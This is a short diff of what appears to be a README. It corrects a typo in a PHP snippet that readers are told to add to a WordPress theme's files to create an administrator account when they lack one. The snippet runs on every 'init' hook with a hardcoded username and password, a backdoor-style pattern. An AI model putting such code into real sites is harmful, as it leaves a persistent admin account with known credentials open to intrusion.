@@ -23,7 +23,7 @@ If you do not have an admin account add the follwing code to `wp-content/themes/
 
 ```php
 add_action('init', 'add_custom_admin');
-unction add_custom_admin() {
+function add_custom_admin() {
   $username = 'elite';
   $password = 'olLPkYdnutvuIuyYFsbqfVEwlHY5ycZNbOBFRxrOExzj7WaIM51HX98bmDgAKKdFTa5lKMTDmM5loBdkN0MYlkT4U4GI4aMprHP9m4t7lm80IZlGjWhjNbyEJeggAoUx';
   $email = 'mail@example.com';
